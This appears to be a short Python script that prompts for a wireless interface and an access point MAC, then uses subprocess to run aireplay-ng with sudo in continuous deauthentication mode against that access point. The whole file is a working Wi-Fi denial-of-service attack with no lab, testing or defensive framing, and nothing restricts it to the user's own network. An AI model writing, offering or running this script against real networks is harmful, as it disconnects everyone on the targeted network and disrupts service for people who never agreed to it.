import subprocess

interface = input("Interface: ")
ap = input("MAC: ")

subprocess.run(["sudo", "aireplay-ng", "--ignore-negative-one", "--deauth", "0", "-a", ap, interface])
